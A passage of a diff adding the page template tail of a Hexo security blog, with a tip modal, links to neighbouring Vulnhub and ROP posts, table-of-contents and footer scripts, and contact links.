+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
+            <div class="card">
+                <a href="/2019/08/01/dpwwn/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="Vulnhub - dpwnn1">
+                        
+                        <span class="card-title">Vulnhub - dpwnn1</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            NmapStarting off with the nmap, using nmap -sV -sC -A 192.168.43.59 shows us that 22, 80 and 3306 i.e. SSH, HTTP, MySQL 
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2019-08-01
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Vulnhub/" class="post-category">
+                                    Vulnhub
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/nmap-ctf-vulnhub/">
+                        <span class="chip bg-color">nmap, ctf, vulnhub</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                Next&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2019/07/26/rop-tools-usage/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="ROP- Basic Exploit Creation">
+                        
+                        <span class="card-title">ROP- Basic Exploit Creation</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            This blog post will teach you basics of ROP i.e. how to use tools efficilently.
+OverviewThis post is more practical, so 
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2019-07-26
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Return-Oriented-Programming/" class="post-category">
+                                    Return Oriented Programming
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/rop-pwn-radare2-pwntools/">
+                        <span class="chip bg-color">rop, pwn, radare2, pwntools</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+<!-- 代码块折行 -->
+
+<style type="text/css">
+code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
+</style>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;TOC</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+    <div class="container row center-align" style="margin-bottom: 15px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            <span id="year">2019</span>
+            <a href="https://d4mianwayne.github.io" target="_blank">D4mianWayne</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;Total Word Count:&nbsp;<span
+                class="white-color">25.7k</span>&nbsp;words
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;Total Visits:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;times
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;Total number of visitors:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;people
+            </span>
+            
+            <br>
+            
+            <span id="sitetime">Loading Runtime....</span>
+            <script>
+                function siteTime() {
+                    var seconds = 1000;
+                    var minutes = seconds * 60;
+                    var hours = minutes * 60;
+                    var days = hours * 24;
+                    var years = days * 365;
+                    var today = new Date();
+                    var startYear = "2019";
+                    var startMonth = "09";
+                    var startDate = "20";
+                    var startHour = "0";
+                    var startMinute = "0";
+                    var startSecond = "0";
+                    var todayYear = today.getFullYear();
+                    var todayMonth = today.getMonth() + 1;
+                    var todayDate = today.getDate();
+                    var todayHour = today.getHours();
+                    var todayMinute = today.getMinutes();
+                    var todaySecond = today.getSeconds();
+                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                    var diff = t2 - t1;
+                    var diffYears = Math.floor(diff / years);
+                    var diffDays = Math.floor((diff / days) - diffYears * 365);
+                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
+                        minutes);
+                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
+                        diffMinutes * minutes) / seconds);
+                    if (startYear == todayYear) {
+                        document.getElementById("year").innerHTML = todayYear;
+                        document.getElementById("sitetime").innerHTML = "This site has been safely operated " + diffDays + " days " + diffHours +
+                            " hours " + diffMinutes + " minutes " + diffSeconds + " seconds";
+                    } else {
+                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                        document.getElementById("sitetime").innerHTML = "This site has been safely operated " + diffYears + " years " + diffDays +
+                            " days " + diffHours + " hours " + diffMinutes + " minutes " + diffSeconds + " seconds";
+                    }
+                }
+                setInterval(siteTime, 1000);
+            </script>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/D4mianWayne" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:dubeyayushmanrobin@gmail.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1181062873" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1181062873" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;Search</span>
+            <input type="search" id="searchInput" name="s" placeholder="Please enter a search keyword"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("/search.xml", 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    
+
+    
+    
+    <script type="text/javascript" size="150" alpha='0.6'
+        zIndex="-1" src="/libs/background/ribbon-refresh.min.js" async="async"></script>
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
